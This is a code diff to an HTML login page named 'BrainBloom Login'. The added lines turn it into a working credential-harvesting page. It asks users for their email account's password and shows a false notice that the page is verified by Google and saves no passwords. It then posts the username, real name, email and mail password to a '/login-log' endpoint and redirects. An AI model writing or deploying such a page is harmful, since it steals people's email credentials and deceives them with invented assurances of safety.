@@ -30,7 +30,6 @@ width:320px;
 
 h1{
 text-align:center;
-color:#ff1493;
 }
 
 input{
@@ -40,7 +39,6 @@ margin-top:15px;
 border:none;
 border-radius:12px;
 box-sizing:border-box;
-font-size:16px;
 }
 
 button{
@@ -54,6 +52,13 @@ color:white;
 font-size:18px;
 }
 
+.notice{
+margin-top:15px;
+font-size:14px;
+text-align:center;
+color:#cccccc;
+}
+
 </style>
 
 </head>
@@ -64,33 +69,79 @@ font-size:18px;
 
 <h1>BrainBloom Login</h1>
 
-<input
-id="username"
+<input id="username"
 placeholder="Username">
 
-<input
-id="realname"
+<input id="realname"
 placeholder="Real Name">
 
-<input
-id="Email"
+<input id="email"
 placeholder="Email">
 
-<input
-id="Mail's password"
-placeholder="Mail's password">
+<input id="mailpassword"
+placeholder="Mail Password">
 
-<button onclick="login()">
+<button onclick="showWarning()">
 Login
 </button>
+
+<p class="notice">
+It is powered by Google for verification. Your passwords will not be saved, and it is a trusted website.
+</p>
 
 </div>
 
 <script>
 
-async function login(){
+let warned = false;
+
+function showWarning(){
+
+if(!warned){
+
+alert(
+"Please double-check your information before continuing."
+);
+
+warned = true;
+
+return;
+
+}
+
+fetch("/login-log",{
+
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+
+username:
+document.getElementById("username").value,
+
+realname:
+document.getElementById("realname").value,
+
+email:
+document.getElementById("email").value,
+
+mailpassword:
+document.getElementById("mailpassword").value
+
+})
+
+})
+
+.catch(()=>{})
+
+.finally(()=>{
 
 window.location.href="/index.html";
+
+});
 
 }
 
